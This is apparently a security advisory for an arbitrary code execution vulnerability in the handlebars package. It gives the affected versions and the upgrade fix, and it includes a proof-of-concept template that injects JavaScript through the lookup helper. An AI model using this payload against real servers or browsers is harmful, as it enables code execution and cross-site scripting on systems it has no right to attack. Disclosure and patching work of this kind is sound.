summary: "Arbitrary Code Execution in handlebars\nVersions of `handlebars` prior to 3.0.8 or\
  \ 4.5.2 are vulnerable to Arbitrary Code Execution. The package's lookup helper fails to properly\
  \ validate templates, allowing attackers to submit templates that execute arbitrary JavaScript\
  \ in the system. It can be used to run arbitrary code in a server processing Handlebars templates\
  \ or on a victim's browser (effectively serving as Cross-Site Scripting).\n\nThe following\
  \ template can be used to demonstrate the vulnerability:  \n```{{#with \"constructor\"}}\n\
  \t{{#with split as |a|}}\n\t\t{{pop (push \"alert('Vulnerable Handlebars JS');\")}}\n\t\t\
  {{#with (concat (lookup join (slice 0 1)))}}\n\t\t\t{{#each (slice 2 3)}}\n\t\t\t\t{{#with\
  \ (apply 0 a)}}\n\t\t\t\t\t{{.}}\n\t\t\t\t{{/with}}\n\t\t\t{{/each}}\n\t\t{{/with}}\n\t{{/with}}\n\
  {{/with}}```\n\n\n## Recommendation\n\nUpgrade to version 3.0.8, 4.5.2 or later."
